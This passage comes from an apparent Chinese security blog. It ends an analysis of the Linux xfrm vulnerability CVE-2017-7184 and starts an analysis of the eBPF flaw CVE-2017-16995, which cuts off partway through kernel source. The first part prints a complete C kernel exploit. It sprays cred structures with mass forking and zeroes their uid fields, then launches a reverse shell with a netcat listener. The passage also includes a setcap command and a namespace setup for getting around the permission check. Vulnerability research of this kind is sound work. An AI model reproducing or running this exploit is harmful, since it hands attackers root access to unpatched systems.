&#125;,&#125;; 而Family Header需要到对应的处理函数中找，以xfrm_add_sa为例，其调用nlmsg_data函数的赋值变量类型为xfrm_usresa_info，即为Family Header。 1struct xfrm_usersa_info *p = nlmsg_data(nlh); 利用思路权限限制所谓权限限制即是在上文中提到的netlink_net_capable(skb, CAP_NET_ADMIN)检查，所需为CAP_NET_ADMIN权限。但在Linux操作系统中存在命名空间这样的权限隔离机制，在每一个NET沙箱中，非ROOT进程可以具有CAP_NET_ADMIN权限。查看命名空间开启的方式为cat /boot/config* | grep CONFIG_USER_NS，若为「y」，则启用了命名空间。 而对于上述限制的绕过有两种方法，一是使用setcap命令为EXP赋予权限，即执行sudo setcap cap_net_raw,cap_net_admin=eip ./exp。二是仿照CVE-2017-7308中设置namespace sandbox，但注意此时无法利用getuid来判断是否为root用户。 12345678910111213141516171819202122232425262728293031323334353637383940void setup_sandbox() &#123; int real_uid = getuid(); int real_gid = getgid(); if (unshare(CLONE_NEWUSER) != 0) &#123; perror(&quot;[-] unshare(CLONE_NEWUSER)&quot;); exit(EXIT_FAILURE); &#125; if (unshare(CLONE_NEWNET) != 0) &#123; perror(&quot;[-] unshare(CLONE_NEWUSER)&quot;); exit(EXIT_FAILURE); &#125; if (!write_file(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;)) &#123; perror(&quot;[-] write_file(/proc/self/set_groups)&quot;); exit(EXIT_FAILURE); &#125; if (!write_file(&quot;/proc/self/uid_map&quot;, &quot;0 %d 1\n&quot;, real_uid))&#123; perror(&quot;[-] write_file(/proc/self/uid_map)&quot;); exit(EXIT_FAILURE); &#125; if (!write_file(&quot;/proc/self/gid_map&quot;, &quot;0 %d 1\n&quot;, real_gid)) &#123; perror(&quot;[-] write_file(/proc/self/gid_map)&quot;); exit(EXIT_FAILURE); &#125; cpu_set_t my_set; CPU_ZERO(&amp;my_set); CPU_SET(0, &amp;my_set); if (sched_setaffinity(0, sizeof(my_set), &amp;my_set) != 0) &#123; perror(&quot;[-] sched_setaffinity()&quot;); exit(EXIT_FAILURE); &#125; if (system(&quot;/sbin/ifconfig lo up&quot;) != 0) &#123; perror(&quot;[-] system(/sbin/ifconfig lo up)&quot;); exit(EXIT_FAILURE); &#125;&#125; 数据包构造本漏洞属于一个利用条件比较宽松的漏洞。首先，xfrm_replay_state_esn是一个变长的数据结构，而其长度可以由用户输入的bmp_len来控制，并由kzalloc申请bmp_len *4 + 0x18大小的内存块。其次，越界读写可以每次写1bit大小的数据，同时也可以将(replay_windows -1)&gt;&gt;5比特大小的内存块清空。 并且cred结构体的申请是通过prepare_creds中的new = kmem_cache_alloc(cred_jar, GFP_KERNEL);得到的，但在调试中发现，本内核的cred_jar是kmalloc-192。 根据内核分配使用的slub+伙伴算法可以知道，对于同一个kmem_cache分配出来的内存块有一定概率是相邻。因此一种很取巧的思路，就是将xfrm_replay_state_esn结构体设置为192(0xc0)以内，以利用kmalloc-192进行分配，并利用fork新建大量进程，使申请大量cred，这样喷射之后有很大概率越界读写漏洞存在的位置之后就是一个cred结构体，这样利用之前提到过的置零一段内存的操作就可以将cred结构体中的部分成员(uid gid等)置零，从而对该进程提权，并通过反弹shell就可以得到一个root权限的shell。 因此对于数据包构造主要根据上述思路。 xfrm_add_sa 在触发xfrm_add_sa函数的数据包中，需要满足128 &lt; bmp_len * 4 +0x18 &lt; 192。并且需要参考之前源码分析中的各项flag及参数检查。 xfrm_new_ae 在触发xfrm_new_ae函数的数据包中，需要对seq_hi、seq及replay_window进行设定，replay_window即将要置零的长度大小，由于连续申请了两块大小相同的结构体，而置零的时候是从第一次申请的位置操作的，有可能出现二者相邻，因此需要将replay_window设置稍大一些。而seq_hi、seq两个数据需要结合之后发送的ah数据包中的seq参数，引导xfrm_replay_advance_esn走向置零bmp[0]~bmp[n]这个分支。 AH数据包 AH数据包的要求即spi需要和之前申请SA的spi相同用于寻找xfrm_state，并且需要满足 diff &gt;= replay_esn-&gt;replay_window，其中diff的数据由xfrm_replay_state_esn中的seq、seq_hi及AH的seq共同决定。还行需在后续单字节写的位置，将cred结构体中usage置回原值。 在xfrm_replay_advance_esn函数执行前后发现，相邻cred中的成员被置零。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;linux/in.h&gt;#include &lt;linux/xfrm.h&gt;#define MAX_PAYLOAD 4096struct ip_auth_hdr &#123; __u8 nexthdr; __u8 hdrlen; __be16 reserved; /* big endian */ __be32 spi; /* big endian */ __be32 seq_no; /* big endian */ __u8 auth_data[8];&#125;;void fork_spary_n(int n,unsigned int time)&#123; int i; for(i = 0;i &lt; n;i++)&#123; int pid ; pid = fork(); if(pid ==0)&#123; sleep(time); if(getuid() == 0)&#123; fprintf(stderr, "[+] now get r00t\n" ); system("id"); system("/home/p4nda/Desktop/reverse_shell"); &#125; else&#123; exit(0); &#125; &#125; &#125;&#125;int init_xfrm_socket()&#123; struct sockaddr_nl addr; int result = -1,xfrm_socket; xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM); if (xfrm_socket&lt;=0)&#123; perror("[-] bad NETLINK_XFRM socket "); return result; &#125; addr.nl_family = PF_NETLINK; addr.nl_pad = 0; addr.nl_pid = getpid(); addr.nl_groups = 0; result = bind(xfrm_socket, (struct sockaddr *)&amp;addr, sizeof(addr)); if (result&lt;0)&#123; perror("[-] bad bind "); close(xfrm_socket); return result; &#125; return xfrm_socket;&#125;int init_recvfd()&#123; int recvfd=-1; recvfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH ); if (recvfd&lt;=0)&#123; perror("[-] bad IPPROTO_AH socket "); &#125; return recvfd;&#125;int init_sendfd()&#123; int sendfd=-1,err; struct sockaddr_in addr; sendfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH ); if (sendfd&lt;=0)&#123; perror("[-] bad IPPROTO_AH socket "); return -1; &#125; memset(&amp;addr,0,sizeof(addr)); addr.sin_family = AF_INET; addr.sin_port = htons(0x4869); addr.sin_addr.s_addr = inet_addr("127.0.0.1"); err = bind(sendfd, (struct sockaddr*)&amp;addr,sizeof(addr)); if (err&lt;0)&#123; perror("[-] bad bind"); return -1; &#125; return sendfd;&#125;void dump_data(char *buf,size_t len)&#123; puts("========================="); int i ; for(i = 0;i&lt;((len/8)*8);i+=8)&#123; printf("0x%lx",*(size_t *)(buf+i) ); if (i%16) printf(" "); else printf("\n"); &#125;&#125;int xfrm_add_sa(int sock,int spi,int bmp_len)&#123; struct sockaddr_nl nladdr; struct msghdr msg; struct nlmsghdr *nlhdr; struct iovec iov; int len = 4096,err; char *data; memset(&amp;nladdr, 0, sizeof(nladdr)); nladdr.nl_family = AF_NETLINK; nladdr.nl_pid = 0; nladdr.nl_groups = 0; nlhdr = (struct nlmsghdr *)malloc(NLMSG_SPACE(len)); memset(nlhdr,0,NLMSG_SPACE(len)); nlhdr-&gt;nlmsg_len = NLMSG_LENGTH(len); nlhdr-&gt;nlmsg_flags = NLM_F_REQUEST; nlhdr-&gt;nlmsg_pid = getpid(); nlhdr-&gt;nlmsg_type = XFRM_MSG_NEWSA; data = NLMSG_DATA(nlhdr); struct xfrm_usersa_info xui; memset(&amp;xui,0,sizeof(xui)); xui.family = AF_INET; xui.id.proto = IPPROTO_AH; xui.id.spi = spi; xui.id.daddr.a4 = inet_addr("127.0.0.1"); xui.lft.hard_byte_limit = 0x10000000; xui.lft.hard_packet_limit = 0x10000000; xui.lft.soft_byte_limit = 0x1000; xui.lft.soft_packet_limit = 0x1000; xui.mode = XFRM_MODE_TRANSPORT; xui.flags = XFRM_STATE_ESN; memcpy(data,&amp;xui,sizeof(xui)); data += sizeof(xui); struct nlattr nla; struct xfrm_algo xa; memset(&amp;nla, 0, sizeof(nla)); memset(&amp;xa, 0, sizeof(xa)); nla.nla_len = sizeof(xa) + sizeof(nla); nla.nla_type = XFRMA_ALG_AUTH; strcpy(xa.alg_name, "digest_null"); xa.alg_key_len = 0; memcpy(data, &amp;nla, sizeof(nla)); data += sizeof(nla); memcpy(data, &amp;xa, sizeof(xa)); data += sizeof(xa); struct xfrm_replay_state_esn rs; memset(&amp;nla, 0, sizeof(nla)); nla.nla_len = sizeof(nla)+sizeof(rs) +bmp_len*8*4; nla.nla_type = XFRMA_REPLAY_ESN_VAL; rs.replay_window = bmp_len; rs.bmp_len = bmp_len; memcpy(data,&amp;nla,sizeof(nla)); data += sizeof(nla); memcpy(data, &amp;rs, sizeof(rs)); data += sizeof(rs); memset(data,'1',bmp_len*4*8); iov.iov_base = (void *)nlhdr; iov.iov_len = nlhdr-&gt;nlmsg_len; memset(&amp;msg, 0, sizeof(msg)); msg.msg_name = (void *)&amp;(nladdr); msg.msg_namelen = sizeof(nladdr); msg.msg_iov = &amp;iov; msg.msg_iovlen = 1; //dump_data(&amp;msg,iov.iov_len); err = sendmsg (sock, &amp;msg, 0); if (err&lt;0)&#123; perror("[-] bad sendmsg"); return -1; &#125; return err;&#125;int xfrm_new_ae(int sock,int spi,int bmp_len,int evil_windows,int seq,int seq_hi)&#123; struct sockaddr_nl nladdr; struct msghdr msg; struct nlmsghdr *nlhdr; struct iovec iov; int len = 4096,err; char *data; memset(&amp;nladdr, 0, sizeof(nladdr)); nladdr.nl_family = AF_NETLINK; nladdr.nl_pid = 0; nladdr.nl_groups = 0; nlhdr = (struct nlmsghdr *)malloc(NLMSG_SPACE(len)); memset(nlhdr,0,NLMSG_SPACE(len)); nlhdr-&gt;nlmsg_len = NLMSG_LENGTH(len); nlhdr-&gt;nlmsg_flags = NLM_F_REQUEST|NLM_F_REPLACE; nlhdr-&gt;nlmsg_pid = getpid(); nlhdr-&gt;nlmsg_type = XFRM_MSG_NEWAE; data = NLMSG_DATA(nlhdr); struct xfrm_aevent_id xai; memset(&amp;xai,0,sizeof(xai)); xai.sa_id.proto = IPPROTO_AH; xai.sa_id.family = AF_INET; xai.sa_id.spi = spi; xai.sa_id.daddr.a4 = inet_addr("127.0.0.1"); memcpy(data,&amp;xai,sizeof(xai)); data += sizeof(xai); struct nlattr nla; memset(&amp;nla, 0, sizeof(nla)); struct xfrm_replay_state_esn rs; memset(&amp;nla, 0, sizeof(nla)); nla.nla_len = sizeof(nla)+sizeof(rs) +bmp_len*8*4; nla.nla_type = XFRMA_REPLAY_ESN_VAL; rs.replay_window = evil_windows; rs.bmp_len = bmp_len; rs.seq_hi = seq_hi; rs.seq = seq; memcpy(data,&amp;nla,sizeof(nla)); data += sizeof(nla); memcpy(data, &amp;rs, sizeof(rs)); data += sizeof(rs); memset(data,'1',bmp_len*4*8); iov.iov_base = (void *)nlhdr; iov.iov_len = nlhdr-&gt;nlmsg_len; memset(&amp;msg, 0, sizeof(msg)); msg.msg_name = (void *)&amp;(nladdr); msg.msg_namelen = sizeof(nladdr); msg.msg_iov = &amp;iov; msg.msg_iovlen = 1; err = sendmsg (sock, &amp;msg, 0); if (err&lt;0)&#123; perror("[-] bad sendmsg"); return -1; &#125; return err; &#125;int sendah(int sock,int spi,int seq )&#123; struct sockaddr_in sai; struct iovec iov; struct msghdr msg; char *data; struct ip_auth_hdr ah; int err; memset(&amp;msg, 0, sizeof(msg)); memset(&amp;sai, 0, sizeof(sai)); sai.sin_addr.s_addr = inet_addr("127.0.0.1"); sai.sin_port = htons(0x4869); sai.sin_family = AF_INET; data = malloc(4096); memset(data,'1',4096); ah.spi = spi; ah.nexthdr = 1; ah.seq_no = seq; ah.hdrlen = (0x10 &gt;&gt; 2) - 2; memcpy(data,&amp;ah,sizeof(ah)); iov.iov_base = (void *)data; iov.iov_len = 4096; memset(&amp;msg, 0, sizeof(msg)); msg.msg_name = (void *)&amp;(sai); msg.msg_namelen = sizeof(sai); msg.msg_iov = &amp;iov; msg.msg_iovlen = 1; //dump_data(&amp;msg,iov.iov_len); //dump_data(nlhdr,iov.iov_len); err = sendmsg (sock, &amp;msg, 0); if (err&lt;0)&#123; perror("[-] bad sendmsg"); return -1; &#125; return err; &#125;int main(int argc, char const *argv[])&#123; int spary_n=0xc00,err,xfrm_socket,recvfd,sendfd; unsigned int time = 1; xfrm_socket=init_xfrm_socket(); if (xfrm_socket&lt;0)&#123; fprintf(stderr, "[-] bad init xfrm socket\n"); exit(-1); &#125; fprintf(stderr, "[+] init xfrm_socket %d \n",xfrm_socket); recvfd = init_recvfd(); if (recvfd&lt;0)&#123; fprintf(stderr, "[-] bad init_recvfd\n"); exit(-1); &#125; fprintf(stderr, "[+] init recvfd : %d \n",recvfd); sendfd = init_sendfd(); if (recvfd&lt;0)&#123; fprintf(stderr, "[-] bad sendfd\n"); exit(-1); &#125; fprintf(stderr, "[+] init sendfd : %d \n",sendfd); //return 0; fprintf(stderr, "[+] start spary %d creds \n",spary_n ); fork_spary_n(spary_n,time); sleep(5); err=xfrm_add_sa(xfrm_socket,4869,0x24); if (err&lt;0)&#123; fprintf(stderr, "[-] bad xfrm_add_sa\n"); exit(-1); &#125; fprintf(stderr, "[+] xfrm_add_sa : %d \n",err); err=xfrm_new_ae(xfrm_socket,4869,0x24,0xc01,0xb40,1); if (err&lt;0)&#123; fprintf(stderr, "[-] bad xfrm_new_ae\n"); exit(-1); &#125; fprintf(stderr, "[+] xfrm_new_ae : %d \n",err); fork_spary_n(spary_n,10); sendah(sendfd,4869, htonl(0x1743)); system("nc -lp 2333");&#125; 最终效果： 总结与之前调试过的漏洞不同在于此漏洞的触发使用了netlink这样的通信机制，因此手册上相关的资料不是很多，需要根据源代码来构造协议中的相应字段。 本文的分析基于的方法利用了该系统内cred申请是通过kmalloc-192这个kmem_cache得到的，虽然可以有效绕过kaslr、SMAP、SMEP保护，但如果cred申请通过的是cred_jar，则这个方法不一定会成功。 关于长亭博客中提到的方法，我也还在尝试。利用思路是用每次写1bit的方法，多次写达到覆盖下一xfrm_replay_state_esn中的bmp_len，从而越界读泄露地址来绕过kaslr。并且可以通过越界写的方法来写如file_operations、tty_struct这样的虚表结构，达到劫持控制流的目的，将ROP数据通过do_msgsnd这样的函数布置在内核里，从而绕过SMEP和SMAP，最终利用控制流劫持跳转回ROP。希望可以在后续分析中调出这种方法。 Reference[1] https://zhuanlan.zhihu.com/p/26674557 [2] https://github.com/snorez/blog/blob/master/cve-2017-7184%20(%E9%95%BF%E4%BA%AD%E5%9C%A8Pwn2Own%E4%B8%8A%E7%94%A8%E4%BA%8E%E6%8F%90%E6%9D%83Ubuntu%E7%9A%84%E6%BC%8F%E6%B4%9E)%20%E7%9A%84%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8.md [3] https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm [4] https://bbs.pediy.com/thread-249192.htm [5] http://blog.chinaunix.net/uid-26675482-id-3255770.html [6] http://onestraw.github.io/linux/netlink-event-signal/ [7] http://www.man7.org/linux/man-pages/man7/netlink.7.html [8] https://github.com/ret2p4nda/linux-kernel-exploits/blob/master/2017/CVE-2017-7308/poc.c]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>VULNERABILITY</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）]]></title>
    <url>%2F2019%2F01%2F18%2FCVE-2017-16995%2F</url>
    <content type="text"><![CDATA[这个漏洞在2017年底被Google Project Zero团队的Jann Horn发现并修复，然而在2018年4月再次被国外安全研究者Vitaly Nikolenko发现，并可以对特定内核版本的Ubuntu 16.04进行提权，这个漏洞不包含堆栈攻击或者控制流劫持，仅用系统调用数据进行提权，是Data-Oriented Attacks在linux内核上的一个典型应用。 本文分析基于v4.4.110，可以从这里下载编译，也可以从这里在线阅读，本文涉及到的代码、镜像等可从这里下载。 EBPF模块分析之前在做pwnable.tw里的seccomp-tools一题时，曾经看过一部分bpf代码，但主要是为了逆向seccomp沙箱的规则。 BPF 的全称是 Berkeley Packet Filter，这是一个用于过滤(filter)网络报文(packet)的架构。Linux中常用的抓包软件tcpdump、wireshark都是基于这个模块来对用户提供抓包的接口的。在linux内核3.15以后，基于原有的BPF模块，Linux重新设计了BPF模块，并称之为extended BPF，简称EBPF。 EBPF主要可以为用户加载数据包过滤代码进入内核，并在收到数据包时触发这段代码。 一个常见的数据包过滤程序编写如下： 调用 syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请一个map结构，这个结构是用户态与内核态交互的一块共享内存。内核态调用BPF_FUNC_map_lookup_elem来查看map中的数据。而用户态通过syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr))查看map中数据，用户可以通过syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr))对map数据进行更新，而map根据linux特性，会将其视为一个文件，并分配一个文件描述符。 调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))将用户编写的EBPF代码加载进入内核，此时将完成对代码合法性的检查，采用模拟执行的方法。 调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd))，将步骤2的EBPF代码与特定的socket进行绑定，此后对于每一个socket数据包执行EBPF代码进行检查，此时为真实执行。 123456789101112131415161718static void prep(void) &#123; mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3); if (mapfd &lt; 0) __exit(strerror(errno)); puts("mapfd finished"); progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0); if (progfd &lt; 0) __exit(strerror(errno)); puts("bpf_prog_load finished"); if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) __exit(strerror(errno)); puts("socketpair finished"); if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0) __exit(strerror(errno)); puts("setsockopt finished");&#125; EBPF指令集介绍EBPF采用的指令集与内核使用的汇编指令不同，采用了一种基于bpf_insn数据结构的指令集,同时还维护了10个寄存器，一个栈，并且有与用户态交互的map结构。 首先是寄存器： 12345678910111213141516R0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；R1~R5：一般用于表示内核预设函数的参数；R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；R10：只读，用作栈指针(SP)可理解对应为物理寄存器为： R0 – rax R1 - rdi R2 - rsi R3 - rdx R4 - rcx R5 - r8 R6 - rbx R7 - r13 R8 - r14 R9 - r15 R10 – rbp 但内核寄存器的实现同EBPF模拟的栈一样，仍然依赖于栈上的临时变量，并不是直接映射为寄存器。后续将从代码层面分析。 接着是指令 1234567struct bpf_insn &#123; __u8 code; /* opcode */ __u8 dst_reg:4; /* dest register */ __u8 src_reg:4; /* source register */ __s16 off; /* signed offset */ __s32 imm; /* signed immediate constant */&#125;; 熟悉seccomp-tools的同学可能发现，这个结构和seccomp的基本差不多。程序的功能主要取决于code这个字节，代表功能，其中code操作码共有8个比特，其中最低3个比特代表大类功能，从如下代码中看出EBPF共分7类功能，定义如下： 12345678910#define BPF_CLASS，(code) ((code) &amp; 0x07)#define BPF_LD 0x00 #define BPF_LDX 0x01#define BPF_ST 0x02#define BPF_STX 0x03#define BPF_ALU 0x04#define BPF_JMP 0x05#define BPF_RET 0x06#define BPF_MISC 0x07 而对于各大类功能还可以从通过异或组成不同的新功能。具体的操作可以参考实现中的定义名，根据操作名就可以看出来每一种功能的大意了，我写了一个解码编码的小工具放在github连接中，可以用来翻译或者辅助编写EBPF程序。 dst_reg代表目的寄存器，限制为0~10，src_reg代表目的寄存器，限制为0~10，off代表地址偏移，imm代表立即数。 下面将从代码层面分析EBPF的运行流程。 BPF_MAP_CREATE这个系统调用首先调用map_create函数，这个函数就是之前分析的bpf模块整数溢出漏洞所在的函数，具体内容可以参照上一篇博客，其核心思想是对申请出一块内存空间，其大小是管理块结构体+attr参数中的size大小，为其分配fd，并将其放入到map队列中，可以用fd号来查找。此部分与本漏洞相关性不大。 map_create 123456789101112131415161718192021222324252627282930313233/* called via syscall */static int map_create(union bpf_attr *attr)&#123; struct bpf_map *map; int err; err = CHECK_ATTR(BPF_MAP_CREATE); if (err) return -EINVAL; /* find map type and init map: hashtable vs rbtree vs bloom vs ... */ map = find_and_alloc_map(attr); if (IS_ERR(map)) return PTR_ERR(map); atomic_set(&amp;map-&gt;refcnt, 1); atomic_set(&amp;map-&gt;usercnt, 1); err = bpf_map_charge_memlock(map); if (err) goto free_map; err = bpf_map_new_fd(map); if (err &lt; 0) /* failed to allocate fd */ goto free_map; return err;free_map: map-&gt;ops-&gt;map_free(map); return err;&#125; BPF_PROG_LOAD这个系统调用用于将用户编写的EBPF规则加载进入内核，其中包含有多处校验。 bpf_prog_load首先进入bpf_prog_load函数中，首先[1]检查的ebpf license是否为GPL证书的一种，[2]检查指令条数是否超过4096，[3]处利用kmalloc新建了一个bpf_prog结构体，并新建了一个用于存放EBPF程序的内存空间。[4]处将用户态的EBPF程序拷贝到刚申请的内存中。[5]处来判断是哪种过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最终到达[5]处开始对用户输入的程序进行检查。如果通过检查就将fp中执行函数赋值为 __bpf_prog_run也就是真实执行函数，并尝试JIT加载，否则用中断的方法加载。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485static int bpf_prog_load(union bpf_attr *attr)&#123; enum bpf_prog_type type = attr-&gt;prog_type; struct bpf_prog *prog; int err; char license[128]; bool is_gpl; if (CHECK_ATTR(BPF_PROG_LOAD)) return -EINVAL; /* copy eBPF program license from user space */ if (strncpy_from_user(license, u64_to_ptr(attr-&gt;license), sizeof(license) - 1) &lt; 0) return -EFAULT; license[sizeof(license) - 1] = 0; /* eBPF programs must be GPL compatible to use GPL-ed functions */[1] is_gpl = license_is_gpl_compatible(license);[2] if (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS) //4096 return -EINVAL; if (type == BPF_PROG_TYPE_KPROBE &amp;&amp; attr-&gt;kern_version != LINUX_VERSION_CODE) return -EINVAL; if (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN)) return -EPERM; /* plain bpf_prog allocation */[3] prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER); if (!prog) return -ENOMEM; err = bpf_prog_charge_memlock(prog); if (err) goto free_prog_nouncharge; prog-&gt;len = attr-&gt;insn_cnt; err = -EFAULT;[4] if (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns), prog-&gt;len * sizeof(struct bpf_insn)) != 0) goto free_prog; prog-&gt;orig_prog = NULL; prog-&gt;jited = 0; atomic_set(&amp;prog-&gt;aux-&gt;refcnt, 1); prog-&gt;gpl_compatible = is_gpl ? 1 : 0; /* find program type: socket_filter vs tracing_filter */[5] err = find_prog_type(type, prog); if (err &lt; 0) goto free_prog; /* run eBPF verifier */[6] err = bpf_check(&amp;prog, attr); // here if (err &lt; 0) goto free_used_maps; /* fixup BPF_CALL-&gt;imm field */ fixup_bpf_calls(prog); /* eBPF program is ready to be JITed */ err = bpf_prog_select_runtime(prog); if (err &lt; 0) goto free_used_maps; err = bpf_prog_new_fd(prog); if (err &lt; 0) /* failed to allocate fd */ goto free_used_maps; return err;free_used_maps: free_used_maps(prog-&gt;aux);free_prog: bpf_prog_uncharge_memlock(prog);free_prog_nouncharge: bpf_prog_free(prog); return err;&#125; bpf_check下面进入加载的检查逻辑——bpf_check，首先在[1]处将特定指令中的mapfd换成相应的map实际地址，这里需要注意，map实际地址是一个内核地址，有8字节，这样就需要有两条指令的长度来存这个地址，具体可以看下面对这个函数的分析。[2]中借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，造成无法预期的风险。[3]是实际模拟执行的检测当上述有任一出现问题的检测，是检测的重点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119int bpf_check(struct bpf_prog **prog, union bpf_attr *attr)&#123; char __user *log_ubuf = NULL; struct verifier_env *env; int ret = -EINVAL; if ((*prog)-&gt;len &lt;= 0 || (*prog)-&gt;len &gt; BPF_MAXINSNS) return -E2BIG; /* 'struct verifier_env' can be global, but since it's not small, * allocate/free it every time bpf_check() is called */ env = kzalloc(sizeof(struct verifier_env), GFP_KERNEL); if (!env) return -ENOMEM; env-&gt;prog = *prog; /* grab the mutex to protect few globals used by verifier */ mutex_lock(&amp;bpf_verifier_lock); if (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123; /* user requested verbose verifier output * and supplied buffer to store the verification trace */ log_level = attr-&gt;log_level; log_ubuf = (char __user *) (unsigned long) attr-&gt;log_buf; log_size = attr-&gt;log_size; log_len = 0; ret = -EINVAL; /* log_* values have to be sane */ if (log_size &lt; 128 || log_size &gt; UINT_MAX &gt;&gt; 8 || log_level == 0 || log_ubuf == NULL) goto free_env; ret = -ENOMEM; log_buf = vmalloc(log_size); if (!log_buf) goto free_env; &#125; else &#123; log_level = 0; &#125;[1] ret = replace_map_fd_with_map_ptr(env); // 采用map结构将BPF_LD_IMM64中的imm参数替换。 if (ret &lt; 0) goto skip_full_check; env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len, sizeof(struct verifier_state_list *), GFP_USER); ret = -ENOMEM; if (!env-&gt;explored_states) goto skip_full_check;[2] ret = check_cfg(env);//控制流图检查是否存在死循环和盲跳转 if (ret &lt; 0) goto skip_full_check; env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);[3] ret = do_check(env);skip_full_check: while (pop_stack(env, NULL) &gt;= 0); free_states(env); if (ret == 0) /* program is valid, convert *(u32*)(ctx + off) accesses */ ret = convert_ctx_accesses(env); if (log_level &amp;&amp; log_len &gt;= log_size - 1) &#123; BUG_ON(log_len &gt;= log_size); /* verifier log exceeded user supplied buffer */ ret = -ENOSPC; /* fall through to return what was recorded */ &#125; /* copy verifier log back to user space including trailing zero */ if (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + 1) != 0) &#123; ret = -EFAULT; goto free_log_buf; &#125; if (ret == 0 &amp;&amp; env-&gt;used_map_cnt) &#123; /* if program passed verifier, update used_maps in bpf_prog_info */ env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt, sizeof(env-&gt;used_maps[0]), GFP_KERNEL); if (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123; ret = -ENOMEM; goto free_log_buf; &#125; memcpy(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps, sizeof(env-&gt;used_maps[0]) * env-&gt;used_map_cnt); env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt; /* program is valid. Convert pseudo bpf_ld_imm64 into generic * bpf_ld_imm64 instructions */ convert_pseudo_ld_imm64(env); &#125;free_log_buf: if (log_level) vfree(log_buf);free_env: if (!env-&gt;prog-&gt;aux-&gt;used_maps) /* if we didn't copy map pointers into bpf_prog_info, release * them now. Otherwise free_bpf_prog_info() will release them. */ release_maps(env); *prog = env-&gt;prog; kfree(env); mutex_unlock(&amp;bpf_verifier_lock); return ret;&#125; replace_map_fd_with_map_ptrreplace_map_fd_with_map_ptr函数中，可以看到当满足[1]、[2]两个条件时，即opcode = BPF_LD | BPF_IMM | BPF_DW=0x18，且src_reg = BPF_PSEUDO_MAP_FD =1时，将根据imm的值进行map查找，并将得到的地址分成两部分，分别存储于该条指令和下一条指令的imm部分，与上文所说的占用两条指令是相符的。满足上述两个条件的语句又被命名为BPF_LD_MAP_FD，即把map地址放到寄存器里，该指令写完后，下一条指令应为无意义的填充。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889static int replace_map_fd_with_map_ptr(struct verifier_env *env)&#123; struct bpf_insn *insn = env-&gt;prog-&gt;insnsi; int insn_cnt = env-&gt;prog-&gt;len; int i, j; for (i = 0; i &lt; insn_cnt; i++, insn++) &#123; if (BPF_CLASS(insn-&gt;code) == BPF_LDX &amp;&amp; (BPF_MODE(insn-&gt;code) != BPF_MEM || insn-&gt;imm != 0)) &#123; verbose("BPF_LDX uses reserved fields\n"); return -EINVAL; &#125;// 不允许向寄存器直接写值 LDX if (BPF_CLASS(insn-&gt;code) == BPF_STX &amp;&amp; ((BPF_MODE(insn-&gt;code) != BPF_MEM &amp;&amp; BPF_MODE(insn-&gt;code) != BPF_XADD) || insn-&gt;imm != 0)) &#123; verbose("BPF_STX uses reserved fields\n"); return -EINVAL; &#125;//不允许向地址写寄存器 STX[1] if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123; struct bpf_map *map; struct fd f; if (i == insn_cnt - 1 || insn[1].code != 0 || insn[1].dst_reg != 0 